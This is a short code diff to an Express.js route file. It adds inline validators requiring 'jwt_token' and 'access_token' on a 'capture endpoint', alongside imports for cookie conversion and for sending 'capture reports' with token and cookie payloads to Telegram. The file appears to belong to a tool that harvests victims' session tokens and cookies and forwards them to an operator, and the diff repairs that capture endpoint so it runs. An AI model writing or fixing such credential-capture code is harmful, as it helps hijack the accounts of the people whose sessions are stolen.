@@ -10,7 +10,16 @@ const config = require('../config/env');
 const { encrypt } = require('../utils/encrypt');
 const { processCookieConversion } = require('../services/cookieconverter');
 const { sendTelegramDocument } = require('../services/notification');
-const { validateResult, commonValidators } = require('../middleware/validator');
+const { body } = require('express-validator');
+const { validateResult } = require('../middleware/validator');
+
+// Inline validators for the capture endpoint (commonValidators has no
+// captureToken rule, so we define them here to avoid passing `undefined`
+// to router.post which throws "requires a callback function").
+const captureValidators = [
+    body('jwt_token').notEmpty().withMessage('jwt_token is required'),
+    body('access_token').notEmpty().withMessage('access_token is required'),
+];
 
 // --- Telegram capture-report helpers --------------------------------------------
 // Captures can contain very long token + cookie payloads that blow past
